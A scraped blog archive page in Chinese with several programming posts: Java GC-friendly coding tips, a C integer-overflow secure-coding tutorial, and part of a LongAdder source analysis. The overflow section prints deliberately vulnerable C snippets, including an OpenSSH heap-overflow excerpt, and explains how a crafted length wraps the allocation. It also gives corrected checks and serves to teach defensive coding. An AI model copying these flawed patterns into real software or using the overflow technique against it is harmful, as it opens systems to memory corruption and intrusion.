某个调用场景下，每次都会新建一个解析器对象去解析结果，尽管解析器没有任何实例变量不会产生线程安全问题，创建的开销也并不大，但我还是坚持要改成单例，使用同一个实例去处理，这也符合面向GC编程的思想。

这些场景，每天我们都在遇到，**也许我们会说这些都是很小的问题，无伤大雅，差不多就行了。**但就像前面说的，这是一种态度，一种思维习惯，当你坚持用最高的标准去要求自己，去要求自己的工作时，你才有可能渐渐接近卓越。细节是魔鬼，它会在完全察觉不到的时刻，把人拉回平庸。

「我不是为了输赢，我就是认真。」这不代表我们不在乎输赢，从头至尾我都坚信，只有坚持完美，坚持品质，坚持那些我们曾经了解现在可能已经放弃了的美好的东西，像一个老工匠，把一种专注、追求极致的情怀融入我们的作品里，也许有一天，就有人，追寻着 [梦想](http://blog.hesey.net/2010/04/a-time-without-dreams.html) ，发现了 [生活更多的可能性](http://blog.hesey.net/2012/02/posibilities-of-life.html) ，像乔布斯、像贝索斯，改变整个行业，改变全世界。

我们是被这个时代推上浪潮之巅的人，是去做一个见证者，或是一个冲在最前面也不怕被拍死的傻瓜，是我们每个人选择的权利。

只是不要忘记，那些傻瓜，不是真的不怕死，**他们只是认真**。

（全文完）

# 面向GC的JAVA编程

#####  [2014年05月07日 ](https://coolshell.cn/articles/11541.html) [王 晨纯](https://coolshell.cn/articles/author/hesey) 评论 [46 条评论](https://coolshell.cn/articles/11541.html#comments) 59,564 人阅读

**（感谢网友 [@Hesey小纯纯](https://weibo.com/tbmujian) 投稿 [博客](http://blog.hesey.net/) |　[原文链接](http://blog.hesey.net/2014/05/gc-oriented-java-programming.html)）**

Java程序员在编码过程中通常不需要考虑内存问题，JVM经过高度优化的GC机制大部分情况下都能够很好地处理堆(Heap)的清理问题。以至于许多Java程序员认为，我只需要关心何时创建对象，而回收对象，就交给GC来做吧！甚至有人说，如果在编程过程中频繁考虑内存问题，是一种退化，这些事情应该交给编译器，交给虚拟机来解决。

这话其实也没有太大问题，的确，大部分场景下关心内存、GC的问题，显得有点“杞人忧天”了，高老爷说过：

过早优化是万恶之源。

但另一方面，**什么才是“过早优化”？**

If we could do things right for the first time, why not?

事实上**JVM的内存模型**( [JMM](http://www.cs.umd.edu/~pugh/java/memoryModel/) )理应是Java程序员的基础知识，处理过几次JVM线上内存问题之后就会很明显感受到，很多系统问题，都是内存问题。

对JVM内存结构感兴趣的同学可以看下 [浅析Java虚拟机结构与机制](http://blog.hesey.net/2011/04/introduction-to-java-virtual-machine.html) 这篇文章，本文就不再赘述了，本文也并不关注具体的GC算法，相关的文章汗牛充栋，随时可查。

另外，不要指望GC优化的这些技巧，可以对应用性能有成倍的提高，特别是对I/O密集型的应用，或是实际落在YoungGC上的优化，可能效果只是帮你减少那么一点YoungGC的频率。

但我认为，**优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著**，就像前面说的，**如果我们可以一次把事情做对，并且做好，在允许的范围内尽可能追求卓越，为什么不去做呢？**

目录



[一、GC分代的基本假设](https://coolshell.cn/articles/11541.html#一、GC分代的基本假设)[二、对象分配的优化](https://coolshell.cn/articles/11541.html#二、对象分配的优化)[三、不可变对象的好处](https://coolshell.cn/articles/11541.html#三、不可变对象的好处)[四、引用置为null的传说](https://coolshell.cn/articles/11541.html#四、引用置为null的传说)[五、手动档的GC](https://coolshell.cn/articles/11541.html#五、手动档的GC)[六、指定容器初始化大小](https://coolshell.cn/articles/11541.html#六、指定容器初始化大小)[七、对象池](https://coolshell.cn/articles/11541.html#七、对象池)[八、对象作用域](https://coolshell.cn/articles/11541.html#八、对象作用域)[九、各类引用](https://coolshell.cn/articles/11541.html#九、各类引用)

#### 一、GC分代的基本假设

大部分GC算法，都将堆内存做分代(Generation)处理，但是为什么要分代呢，又为什么不叫内存分区、分段，而要用面向时间、年龄的“代”来表示不同的内存区域？

GC分代的**基本假设**是：

**绝大部分对象的生命周期都非常短暂，存活时间短。**

而这些短命的对象，恰恰是GC算法需要首先关注的。所以在大部分的GC中，YoungGC（也称作MinorGC）占了绝大部分，对于负载不高的应用，可能跑了数个月都不会发生FullGC。

基于这个前提，在编码过程中，我们应该**尽可能地缩短对象的生命周期**。在过去，分配对象是一个比较重的操作，所以有些程序员会尽可能地减少new对象的次数，尝试减小堆的分配开销，减少内存碎片。

但是，短命对象的创建在JVM中比我们想象的性能更好，所以，不要吝啬new关键字，大胆地去new吧。

当然前提是不做无谓的创建，对象创建的速率越高，那么GC也会越快被触发。

结论：

- 分配小对象的开销分享小，不要吝啬去创建。
- GC最喜欢这种小而短命的对象。
- 让对象的生命周期尽可能短，例如在方法体内创建，使其能尽快地在YoungGC中被回收，不会晋升(romote)到年老代(Old Generation)。

#### 二、对象分配的优化

基于大部分对象都是小而短命，并且不存在多线程的数据竞争。这些小对象的分配，会优先在线程私有的 **TLAB** 中分配，TLAB中创建的对象，不存在锁甚至是CAS的开销。

TLAB占用的空间在Eden Generation。

当对象比较大，TLAB的空间不足以放下，而JVM又认为当前线程占用的TLAB剩余空间还足够时，就会直接在Eden Generation上分配，此时是存在并发竞争的，所以会有CAS的开销，但也还好。

当对象大到Eden Generation放不下时，JVM只能尝试去Old Generation分配，这种情况需要尽可能避免，因为一旦在Old Generation分配，这个对象就只能被Old Generation的GC或是FullGC回收了。

#### 三、不可变对象的好处

GC算法在扫描存活对象时通常需要从ROOT节点开始，扫描所有存活对象的引用，构建出对象图。

不可变对象对GC的优化，主要体现在Old Generation中。

可以想象一下，如果存在Old Generation的对象引用了Young Generation的对象，那么在每次YoungGC的过程中，就必须考虑到这种情况。

Hotspot JVM为了提高YoungGC的性能，避免每次YoungGC都扫描Old Generation中的对象引用，采用了 **卡表(Card Table)** 的方式。

简单来说，当Old Generation中的对象发生对Young Generation中的对象产生新的引用关系或释放引用时，都会在卡表中响应的标记上标记为脏(dirty)，而YoungGC时，只需要扫描这些dirty的项就可以了。

可变对象对其它对象的引用关系可能会频繁变化，并且有可能在运行过程中持有越来越多的引用，特别是容器。这些都会导致对应的卡表项被频繁标记为dirty。

而不可变对象的引用关系非常稳定，在扫描卡表时就不会扫到它们对应的项了。

注意，这里的不可变对象，不是指仅仅自身引用不可变的final对象，而是真正的**Immutable Objects**。

#### 四、引用置为null的传说

早期的很多Java资料中都会提到在方法体中将一个变量置为null能够优化GC的性能，类似下面的代码：



List<**String**> list = new ArrayList<**String**>();

// some code

list = **null**; // help GC



事实上这种做法对GC的帮助微乎其微，有时候反而会导致代码混乱。

我记得几年前 @rednaxelafx 在HLL VM小组中详细论述过这个问题，原帖我没找到，结论基本就是：

- 在一个非常大的方法体内，对一个较大的对象，将其引用置为null，某种程度上可以帮助GC。
- 大部分情况下，这种行为都没有任何好处。

所以，还是早点放弃这种“优化”方式吧。

GC比我们想象的更聪明。

#### 五、手动档的GC

在很多Java资料上都有下面两个奇技淫巧：

- 通过**Thread.yield()**让出CPU资源给其它线程。
- 通过**System.gc()**触发GC。

事实上JVM从不保证这两件事，而System.gc()在JVM启动参数中如果允许显式GC，则会**触发FullGC**，对于响应敏感的应用来说，几乎等同于自杀。

So，让我们牢记两点：

- Never use Thread.yield()。
- Never use System.gc()。除非你真的需要回收Native Memory。

第二点有个Native Memory的例外，如果你在以下场景：

- 使用了NIO或者NIO框架（Mina/Netty）
- 使用了DirectByteBuffer分配字节缓冲区
- 使用了MappedByteBuffer做内存映射

由于**Native Memory只能通过FullGC（或是CMS GC）回收**，所以除非你非常清楚这时真的有必要，否则不要轻易调用System.gc()，且行且珍惜。

另外为了防止某些框架中的System.gc调用（例如NIO框架、Java RMI），建议在启动参数中加上-XX:+DisableExplicitGC来禁用显式GC。

这个参数有个巨大的坑，如果你禁用了System.gc()，那么上面的3种场景下的内存就无法回收，可能造成OOM，如果你使用了CMS GC，那么可以用这个参数替代：-XX:+ExplicitGCInvokesConcurrent。

关于System.gc()，可以参考 @bluedavy 的几篇文章：

- [CMS GC会不会回收Direct ByteBuffer的内存](http://hellojava.info/?p=56)
- [说说在Java启动参数上我犯的错](http://hellojava.info/?p=323)
- [java.lang.OutOfMemoryError:Map failed](http://hellojava.info/?p=319)

 

#### 六、指定容器初始化大小

Java容器的一个特点就是可以动态扩展，所以通常我们都不会去考虑初始大小的设置，不够了反正会自动扩容呗。

但是扩容不意味着没有代价，甚至是很高的代价。

例如一些基于数组的数据结构，例如StringBuilder、StringBuffer、ArrayList、HashMap等等，在扩容的时候都需要做ArrayCopy，对于不断增长的结构来说，经过若干次扩容，会存在大量无用的老数组，而回收这些数组的压力，全都会加在GC身上。

这些容器的构造函数中通常都有一个可以指定大小的参数，如果对于某些大小可以预估的容器，建议加上这个参数。

可是因为容器的扩容并不是等到容器满了才扩容，而是有一定的比例，例如HashMap的扩容阈值和负载因子(loadFactor)相关。

Google Guava框架对于容器的初始容量提供了非常便捷的工具方法，例如：

[code lang=”java”]Lists.newArrayListWithCapacity(initialArraySize);

Lists.newArrayListWithExpectedSize(estimatedSize);

Sets.newHashSetWithExpectedSize(expectedSize);

Maps.newHashMapWithExpectedSize(expectedSize);
[/code]

这样我们只要传入预估的大小即可，容量的计算就交给Guava来做吧。

**反例**：如果采用默认无参构造函数，创建一个ArrayList，不断增加元素直到OOM，那么在此过程中会导致：

- 多次数组扩容，重新分配更大空间的数组
- 多次数组拷贝
- 内存碎片

#### 七、对象池

为了减少对象分配开销，提高性能，可能有人会采取对象池的方式来缓存对象集合，作为复用的手段。

但是对象池中的对象由于在运行期长期存活，大部分会晋升到Old Generation，因此无法通过YoungGC回收。

并且通常……没有什么效果。

对于对象本身：

- 如果对象很小，那么分配的开销本来就小，对象池只会增加代码复杂度。
- 如果对象比较大，那么晋升到Old Generation后，对GC的压力就更大了。

从线程安全的角度考虑，通常池都是会被并发访问的，那么你就需要处理好同步的问题，这又是一个大坑，并且**同步带来的开销，未必比你重新创建一个对象小**。

对于对象池，唯一合适的场景就是**当池中的每个对象的创建开销很大**时，缓存复用才有意义，例如每次new都会创建一个连接，或是依赖一次RPC。

比如说：

- 线程池
- 数据库连接池
- TCP连接池

即使你真的需要实现一个对象池，也请使用成熟的开源框架，例如Apache Commons Pool。

另外，使用JDK的ThreadPoolExecutor作为线程池，不要重复造轮子，除非当你看过AQS的源码后认为你可以写得比Doug Lea更好。

#### 八、对象作用域

尽可能缩小对象的作用域，即生命周期。

- 如果可以在方法内声明的局部变量，就不要声明为实例变量。
- 除非你的对象是单例的或不变的，否则尽可能少地声明static变量。

#### 九、各类引用

java.lang.ref.Reference有几个子类，用于处理和GC相关的引用。JVM的引用类型简单来说有几种：

- Strong Reference，最常见的引用
- Weak Reference，当没有指向它的强引用时会被GC回收
- Soft Reference，只当临近OOM时才会被GC回收
- Phantom Reference，主要用于识别对象被GC的时机，通常用于做一些清理工作

当你需要实现一个缓存时，可以考虑优先使用WeakHashMap，而不是HashMap，当然，更好的选择是使用框架，例如Guava Cache。

最后，再次提醒，以上的这些未必可以对代码有多少性能上的提升，但是熟悉这些方法，是为了帮助我们写出更卓越的代码，和GC更好地合作。

（全文完）

# C语言的整型溢出问题

#####  [2014年04月21日 ](https://coolshell.cn/articles/11466.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [96 条评论](https://coolshell.cn/articles/11466.html#comments) 109,655 人阅读

整型溢出有点老生常谈了，bla, bla, bla… 但似乎没有引起多少人的重视。整型溢出会有可能导致缓冲区溢出，缓冲区溢出会导致各种黑客攻击，比如最近OpenSSL的heartbleed事件，就是一个buffer overread的事件。在这里写下这篇文章，希望大家都了解一下整型溢出，编译器的行为，以及如何防范，以写出更安全的代码。

目录



[什么是整型溢出](https://coolshell.cn/articles/11466.html#什么是整型溢出)[整型溢出的危害](https://coolshell.cn/articles/11466.html#整型溢出的危害)[示例一：整形溢出导致死循环](https://coolshell.cn/articles/11466.html#示例一：整形溢出导致死循环)[示例二：整形转型时的溢出](https://coolshell.cn/articles/11466.html#示例二：整形转型时的溢出)[示例三：分配内存](https://coolshell.cn/articles/11466.html#示例三：分配内存)[示例四：缓冲区溢出导致安全问题](https://coolshell.cn/articles/11466.html#示例四：缓冲区溢出导致安全问题)[示例五：size_t 的溢出](https://coolshell.cn/articles/11466.html#示例五：size_t_的溢出)[关于编译器的行为](https://coolshell.cn/articles/11466.html#关于编译器的行为)[编译器优化](https://coolshell.cn/articles/11466.html#编译器优化)[花絮：编译器的彩蛋](https://coolshell.cn/articles/11466.html#花絮：编译器的彩蛋)[正确检测整型溢出](https://coolshell.cn/articles/11466.html#正确检测整型溢出)[二分取中搜索算法中的溢出](https://coolshell.cn/articles/11466.html#二分取中搜索算法中的溢出)[上溢出和下溢出的检查](https://coolshell.cn/articles/11466.html#上溢出和下溢出的检查)[其它](https://coolshell.cn/articles/11466.html#其它)

#### 什么是整型溢出

C语言的整型问题相信大家并不陌生了。对于整型溢出，分为无符号整型溢出和有符号整型溢出。

**对于unsigned整型溢出，C的规范是有定义的**——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。例如：

```
unsigned char x = 0xff;
printf("%d\n", ++x);
```

上面的代码会输出：0 （因为0xff + 1是256，与2^8求模后就是0）

**对于signed整型的溢出，C的规范定义是“undefined behavior”**，也就是说，编译器爱怎么实现就怎么实现。对于大多数编译器来说，算得啥就是啥。比如：

```
signed char x =0x7f; //注：0xff就是-1了，因为最高位是1也就是负数了
printf("%d\n", ++x);
```

上面的代码会输出：-128，因为0x7f + 0x01得到0x80，也就是二进制的1000 0000，符号位为1，负数，后面为全0，就是负的最小数，即-128。



另外，千万别以为signed整型溢出就是负数，这个是不定的。比如：

```
signed char x = 0x7f;
signed char y = 0x05;
signed char r = x * y;
printf("%d\n", r);
```

上面的代码会输出：123

相信对于这些大家不会陌生了。

#### 整型溢出的危害

下面说一下，整型溢出的危害。

##### 示例一：整形溢出导致死循环

```
 ... ...
... ...
short len = 0;
... ...
while(len< MAX_LEN) {
    len += readFromInput(fd, buf);
    buf += len;
}
```

上面这段代码可能是很多程序员都喜欢写的代码（我在很多代码里看到过多次），其中的MAX_LEN 可能会是个比较大的整型，比如32767，我们知道short是16bits，取值范围是-32768 到 32767 之间。但是，上面的while循环代码有可能会造成整型溢出，而len又是个有符号的整型，所以可能会成负数，导致不断地死循环。

##### 示例二：整形转型时的溢出

```
int copy_something(char *buf, int len)
{
    #define MAX_LEN 256
    char mybuf[MAX_LEN];
     ... ...
     ... ...

     if(len > MAX_LEN){ // <---- [1]
         return -1;
     }

     return memcpy(mybuf, buf, len);
}
```

上面这个例子中，还是[1]处的if语句，看上去没有会问题，但是len是个signed int，而memcpy则需一个size_t的len，也就是一个unsigned 类型。于是，len会被提升为unsigned，此时，如果我们给len传一个负数，会通过了if的检查，但在memcpy里会被提升为一个正数，于是我们的mybuf就是overflow了。这个会导致mybuf缓冲区后面的数据被重写。

##### 示例三：分配内存

关于整数溢出导致堆溢出的很典型的例子是，OpenSSH Challenge-Response SKEY/BSD_AUTH 远程缓冲区溢出漏洞。下面这段有问题的代码摘自OpenSSH的代码中的auth2-chall.c中的input_userauth_info_response() 函数:

```
nresp = packet_get_int();
if (nresp > 0) {
    response = xmalloc(nresp*sizeof(char*));
    for (i = 0; i < nresp; i++)
        response[i] = packet_get_string(NULL);
}
```

上面这个代码中，nresp是size_t类型（size_t一般就是unsigned int/long int），这个示例是一个解数据包的示例，一般来说，数据包中都会有一个len，然后后面是data。如果我们精心准备一个len，比如：1073741825（在32位系统上，指针占4个字节，unsigned int的最大值是0xffffffff，我们只要提供0xffffffff/4 的值——0x40000000，这里我们设置了0x4000000 + 1）， nresp就会读到这个值，然后nresp*sizeof(char*)就成了 1073741825 * 4，于是溢出，结果成为了 0x100000004，然后求模，得到4。于是，malloc(4)，于是后面的for循环1073741825 次，就可以干环事了（经过0x40000001的循环,用户的数据早已覆盖了xmalloc原先分配的4字节的空间以及后面的数据，包括程序代码，函数指针，于是就可以改写程序逻辑。关于更多的东西，你可以看一下这篇文章《[Survey of Protections from Buffer-Overflow Attacks](http://engj.org/index.php/ej/article/view/112/167)》）。

##### 示例四：缓冲区溢出导致安全问题

```
int func(char *buf1, unsigned int len1,
         char *buf2, unsigned int len2 )
{
   char mybuf[256]; 

   if((len1 + len2) > 256){    //<--- [1]
       return -1;
   } 

   memcpy(mybuf, buf1, len1);
   memcpy(mybuf + len1, buf2, len2); 

   do_some_stuff(mybuf); 

   return 0;
}
```

上面这个例子本来是想把buf1和buf2的内容copy到mybuf里，其中怕len1 + len2超过256 还做了判断，但是，如果len1+len2溢出了，根据unsigned的特性，其会与2^32求模，所以，基本上来说，上面代码中的[1]处有可能为假的。（注：通常来说，在这种情况下，如果你开启-O代码优化选项，那个if语句块就全部被和谐掉了——被编译器给删除了）比如，你可以测试一下 len1=0x104， len2 = 0xfffffffc 的情况。

##### 示例五：size_t 的溢出

```
for (int i= strlen(s)-1;  i>=0; i--)  { ... }
for (int i=v.size()-1; i>=0; i--)  { ... }
```

上面这两个示例是我们经常用的从尾部遍历一个数组的for循环。第一个是字符串，第二个是C++中的vector容器。strlen()和vector::size()返回的都是 size_t，size_t在32位系统下就是一个unsigned int。你想想，如果strlen(s)和v.size() 都是0呢？这个循环会成为个什么情况？于是strlen(s) – 1 和 v.size() – 1 都不会成为 -1，而是成为了 (unsigned int)(-1)，一个正的最大数。导致你的程序越界访问。

这样的例子有很多很多，这些整型溢出的问题如果在关键的地方，尤其是在搭配有用户输入的地方，如果被黑客利用了，就会导致很严重的安全问题。

#### 关于编译器的行为

在谈一下如何正确的检查整型溢出之前，我们还要来学习一下编译器的一些东西。请别怪我罗嗦。

##### 编译器优化

如何检查整型溢出或是整型变量是否合法有时候是一件很麻烦的事情，就像上面的第四个例子一样，编译的优化参数-O/-O2/-O3基本上会假设你的程序不会有整形溢出。会把你的代码中检查溢出的代码给优化掉。

关于编译器的优化，在这里再举个例子，假设我们有下面的代码（又是一个相当相当常见的代码）：

```
int len;
char* data;

if (data + len < data){
    printf("invalid len\n");
    exit(-1);
}
```

上面这段代码中，len 和 data 配套使用，我们害怕len的值是非法的，或是len溢出了，于是我们写下了if语句来检查。这段代码在-O的参数下正常。但是在-O2的编译选项下，整个if语句块被优化掉了。

你可以写个小程序，在gcc下编译（我的版本是4.4.7，记得加上-O2和-g参数），然后用gdb调试时，用disass /m命信输出汇编，你会看到下面的结果（你可以看到整个if语句块没有任何的汇编代码——直接被编译器和谐掉了）：

```
7 int len = 10;
8 char* data = (char *)malloc(len);
0x00000000004004d4 <+4>: mov $0xa,%edi
0x00000000004004d9 <+9>: callq 0x4003b8 <malloc@plt>

9
10 if (data + len < data){
11 printf("invalid len\n");
12 exit(-1);
13 }
14
15 }
0x00000000004004de <+14>: add $0x8,%rsp
0x00000000004004e2 <+18>: retq
```

对此，你需要把上面 char* 转型成 uintptr_t 或是 size_t，说白了也就是把char*转成unsigned的数据结构，if语句块就无法被优化了。如下所示：

```
if ((uintptr_t)data + len < (uintptr_t)data){
    ... ...
}
```

关于这个事，你可以看一下C99的规范说明《 [ISO/IEC 9899:1999 C specification](http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1124.pdf) 》第 §6.5.6 页，第8点，我截个图如下：（这段话的意思是定义了指针+/-一个整型的行为，如果越界了，则行为是undefined）

![img](photo/c99.jpg)

注意上面标红线的地方，说如果指针指在数组范围内没事，如果越界了就是undefined，也就是说这事交给编译器实现了，编译器想咋干咋干，那怕你想把其优化掉也可以。在这里要重点说一下，**C语言中的一个大恶魔—— Undefined! 这里都是“野兽出没”的地方，你一定要小心小心再小心**。

##### 花絮：编译器的彩蛋

上面说了所谓的undefined行为就全权交给编译器实现，gcc在1.17版本下对于undefined的行为还玩了个彩蛋（[参看Wikipedia](https://en.wikipedia.org/wiki/Undefined_behavior#Compiler_easter_eggs)）。

下面gcc 1.17版本下的遭遇undefined行为时，gcc在unix发行版下玩的彩蛋的源代码。我们可以看到，它会去尝试去执行一些游戏[NetHack](https://en.wikipedia.org/wiki/NetHack)， [Rogue](https://en.wikipedia.org/wiki/Rogue_(computer_game)) 或是Emacs的 [Towers of Hanoi](https://en.wikipedia.org/wiki/Tower_of_Hanoi#Applications)，如果找不到，就输出一条NB的报错。

```
execl("/usr/games/hack", "#pragma", 0); // try to run the game NetHack
execl("/usr/games/rogue", "#pragma", 0); // try to run the game Rogue
// try to run the Tower's of Hanoi simulation in Emacs.
execl("/usr/new/emacs", "-f","hanoi","9","-kill",0);
execl("/usr/local/emacs","-f","hanoi","9","-kill",0); // same as above
fatal("You are in a maze of twisty compiler features, all different");
```

#### 正确检测整型溢出

在看过编译器的这些行为后，你应该会明白——“**在整型溢出之前，一定要做检查，不然，就太晚了**”。

我们来看一段代码：

```
 void foo(int m, int n)
{
    size_t s = m + n;
    .......
}
```

上面这段代码有两个风险：**1）有符号转无符号**，**2）整型溢出**。这两个情况在前面的那些示例中你都应该看到了。**所以，你千万不要把任何检查的代码写在 s = m + n 这条语名后面，不然就太晚了**。undefined行为就会出现了——用句纯正的英文表达就是——“Dragon is here”——你什么也控制不住了。（注意：有些初学者也许会以为size_t是无符号的，而根据优先级 m 和 n 会被提升到unsigned int。其实不是这样的，m 和 n 还是signed int，m + n 的结果也是signed int，然后再把这个结果转成unsigned int 赋值给s）

比如，下面的代码是错的：

```
 void foo(int m, int n)
{
    size_t s = m + n;
    if ( m>0 && n>0 && (SIZE_MAX - m < n) ){
        //error handling...
    }
}
```

上面的代码中，大家要注意 **(SIZE_MAX – m < n)** 这个判断，为什么不用m + n > SIZE_MAX呢？因为，如果 m + n 溢出后，就被截断了，所以表达式恒真，也就检测不出来了。另外，这个表达式中，m和n分别会被提升为unsigned。

但是上面的代码是错的，因为：

1）检查的太晚了，if之前编译器的undefined行为就已经出来了（你不知道什么会发生）。

2）就像前面说的一样，(SIZE_MAX – m < n) 可能会被编译器优化掉。

3）另外，SIZE_MAX是size_t的最大值，size_t在64位系统下是64位的，严谨点应该用INT_MAX或是UINT_MAX

 所以，正确的代码应该是下面这样：

```
 void foo(int m, int n)
{
    size_t s = 0;
    if ( m>0 && n>0 && ( UINT_MAX - m < n ) ){
        //error handling...
        return;
    }
    s = (size_t)m + (size_t)n;
}
```

在《[苹果安全编码规范](https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/SecureCodingGuide.pdf)》（PDF）中，第28页的代码中：

![img](photo/apple_security_code.jpg)

如果n和m都是signed int，那么这段代码是错的。正确的应该像上面的那个例子一样，至少要在n*m时要把 n 和 m 给 cast 成 size_t。因为，n*m可能已经溢出了，已经undefined了，undefined的代码转成size_t已经没什么意义了。（如果m和n是unsigned int，也会溢出），上面的代码仅在m和n是size_t的时候才有效。

不管怎么说，《[苹果安全编码规范](https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/SecureCodingGuide.pdf)》绝对值得你去读一读。

##### 二分取中搜索算法中的溢出

我们再来看一个二分取中搜索算法（binary search），大多数人都会写成下面这个样子：

```
int binary_search(int a[], int len, int key)
{
    int low = 0; 
    int high = len - 1; 

    while ( low<=high ) {
        int mid = (low + high)/2;
        if (a[mid] == key) {
            return mid;
        }
        if (key < a[mid]) {
            high = mid - 1;
        }else{
            low = mid + 1;
        }
    }
    return -1;
}
```

上面这个代码中，你可能会有这样的想法：

1） 我们应该用size_t来做len, low, high, mid这些变量的类型。没错，应该是这样的。但是如果这样，你要小心第四行 int high = len -1; 如果len为0，那么就“high大发了”。

2） 无论你用不用size_t。我们在计算mid = (low+high)/2; 的时候，(low + high) 都可以溢出。正确的写法应该是：

```
int mid = low + (high - low)/2;
```

##### 上溢出和下溢出的检查

前面的代码只判断了正数的上溢出overflow，没有判断负数的下溢出underflow。让们来看看怎么判断：

对于加法，还好。

```
#include <limits.h>

void f(signed int si_a, signed int si_b) {
    signed int sum;
    if (((si_b > 0) && (si_a > (INT_MAX - si_b))) ||
        ((si_b < 0) && (si_a < (INT_MIN - si_b)))) {
        /* Handle error */
        return;
    }
    sum = si_a + si_b;
}
```

对于乘法，就会很复杂（下面的代码太夸张了）：

```
void func(signed int si_a, signed int si_b)
{
  signed int result;
  if (si_a > 0) {  /* si_a is positive */
    if (si_b > 0) {  /* si_a and si_b are positive */
      if (si_a > (INT_MAX / si_b)) {
        /* Handle error */
      }
    } else { /* si_a positive, si_b nonpositive */
      if (si_b < (INT_MIN / si_a)) {
        /* Handle error */
      }
    } /* si_a positive, si_b nonpositive */
  } else { /* si_a is nonpositive */
    if (si_b > 0) { /* si_a is nonpositive, si_b is positive */
      if (si_a < (INT_MIN / si_b)) {
        /* Handle error */
      }
    } else { /* si_a and si_b are nonpositive */
      if ( (si_a != 0) && (si_b < (INT_MAX / si_a))) {
        /* Handle error */
      }
    } /* End if si_a and si_b are nonpositive */
  } /* End if si_a is nonpositive */

  result = si_a * si_b;
}
```

更多的防止在操作中整型溢出的安全代码可以参看《[INT32-C. Ensure that operations on signed integers do not result in overflow](https://www.securecoding.cert.org/confluence/display/seccode/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow)》

#### 其它

对于C++来说，你应该使用STL中的numeric_limits::max() 来检查溢出。

另外，微软的SafeInt类是一个可以帮你远理上面这些很tricky的类，下载地址：http://safeint.codeplex.com/

对于Java 来说，一种是用JDK 1.7中Math库下的safe打头的函数，如safeAdd()和safeMultiply()，另一种用更大尺寸的数据类型，最大可以到BigInteger。

可见，写一个安全的代码并不容易，尤其对于C/C++来说。对于黑客来说，他们只需要搜一下开源软件中代码有memcpy/strcpy之类的地方，然后看一看其周边的代码，是否可以通过用户的输入来影响，如果有的话，你就惨了。

**参考**：

- [Basic Integer Overflow](http://phrack.org/issues/60/10.html)

- [OWASP：Integer overflow](https://www.owasp.org/index.php/Integer_overflow)

- [C compilers may silently discard some wraparound checks](https://www.kb.cert.org/vuls/id/162289)

- [Apple Secure Coding Guide](https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/SecureCodingGuide.pdf)

- [Wikipedia: Undefined Behavior](https://en.wikipedia.org/wiki/Undefined_behavior)

- [INT32-C. Ensure that operations on signed integers do not result in overflow](https://www.securecoding.cert.org/confluence/display/seccode/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow)

最后， 不好意思，这篇文章可能罗嗦了一些，大家见谅。

（全文完）

# 从LONGADDER看更高效的无锁实现

#####  [2014年04月17日 ](https://coolshell.cn/articles/11454.html) [Liuinsect](https://coolshell.cn/articles/author/liuinsect) 评论 [35 条评论](https://coolshell.cn/articles/11454.html#comments) 47,391 人阅读

**（感谢 [@jd刘锟洋](http://weibo.com/liuinsect) 投稿，更多文章参看他的博客：[码梦为生](http://www.liuinsect.com/)）**

**原文链接**：《[比AtomicLong还高效的LongAdder 源码解析](http://www.liuinsect.com/2014/04/15/比atomiclong还高效的longadder-源码解析/)》

接触到AtomicLong的原因是在看guava的LoadingCache相关代码时，关于LoadingCache，其实思路也非常简单清晰：用模板模式解决了缓存不命中时获取数据的逻辑，这个思路我早前也正好在项目中使用到。

言归正传，为什么说LongAdder引起了我的注意，原因有二：

1. 作者是Doug lea ，地位实在举足轻重。
2. 他说这个比AtomicLong高效。

我们知道，AtomicLong已经是非常好的解决方案了，涉及并发的地方都是使用CAS操作，在硬件层次上去做 compare and set操作。效率非常高。

因此，我决定研究下，为什么LongAdder比AtomicLong高效。

首先，看LongAdder的继承树：

![la1](http://www.liuinsect.com/wp-content/uploads/2014/04/la1.png)

继承自Striped64，这个类包装了一些很重要的内部类和操作。稍候会看到。



**正式开始前，强调下，我们知道，AtomicLong的实现方式是内部有个value 变量，当多线程并发自增，自减时，均通过CAS 指令从机器指令级别操作保证并发的原子性。**

再看看LongAdder的方法：

![la2](http://www.liuinsect.com/wp-content/uploads/2014/04/la2.png)
怪不得可以和AtomicLong作比较，连API都这么像。我们随便挑一个API入手分析，这个API通了，其他API都大同小异，因此，我选择了add这个方法。事实上,其他API也都依赖这个方法。

![la3](http://www.liuinsect.com/wp-content/uploads/2014/04/la3.png)
LongAdder中包含了一个Cell 数组，Cell是Striped64的一个内部类，顾名思义，Cell 代表了一个最小单元，这个单元有什么用，稍候会说道。先看定义：

![la4](http://www.liuinsect.com/wp-content/uploads/2014/04/la4.png)
Cell内部有一个非常重要的value变量，并且提供了一个CAS更新其值的方法。

回到add方法：

![la3](http://www.liuinsect.com/wp-content/uploads/2014/04/la3.png)

这里，我有个疑问，AtomicLong已经使用CAS指令，非常高效了（比起各种锁），LongAdder如果还是用CAS指令更新值，怎么可能比AtomicLong高效了？ 何况内部还这么多判断！！！

这是我开始时最大的疑问，所以，我猜想，难道有比CAS指令更高效的方式出现了？ 带着这个疑问，继续。

第一if 判断，第一次调用的时候cells数组肯定为null,因此，进入casBase方法：

![la5](http://www.liuinsect.com/wp-content/uploads/2014/04/la5.png)
原子更新base没啥好说的，如果更新成功，本地调用开始返回，否则进入分支内部。

什么时候会更新失败？ 没错，并发的时候，好戏开始了，AtomicLong的处理方式是死循环尝试更新，直到成功才返回，而LongAdder则是进入这个分支。

分支内部，通过一个Threadlocal变量threadHashCode 获取一个HashCode对象，该HashCode对象依然是Striped64类的内部类，看定义：

![la6](http://www.liuinsect.com/wp-content/uploads/2014/04/la6.png)
有个code变量，保存了一个非0的随机数随机值。

回到add方法：

![la3](http://www.liuinsect.com/wp-content/uploads/2014/04/la3.png)

拿到该线程相关的HashCode对象后，获取它的code变量，as[(n-1)&h] 这句话相当于对h取模，只不过比起取模，因为是 与 的运算所以效率更高。

计算出一个在Cells 数组中当先线程的HashCode对应的 索引位置，并将该位置的Cell 对象拿出来用CAS更新它的value值。

当然，如果as 为null 并且更新失败，才会进入retryUpdate方法。

